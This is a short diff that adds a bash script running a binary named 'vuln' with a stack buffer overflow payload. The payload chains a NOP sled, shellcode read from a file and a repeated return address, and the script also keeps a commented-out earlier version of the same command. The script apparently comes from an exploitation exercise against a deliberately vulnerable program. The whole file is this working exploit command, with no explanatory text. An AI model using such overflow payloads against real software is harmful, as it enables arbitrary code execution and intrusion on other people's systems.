@@ -1,0 +1,4 @@
+#!/bin/bash
+
+#./vuln `perl -e 'print "\x90"x202;'``cat shellcode`
+./vuln `perl -e 'print "\x90"x202;'``cat shellcode``perl -e 'print "\x68\xf9\xff\xbf"x90;'`
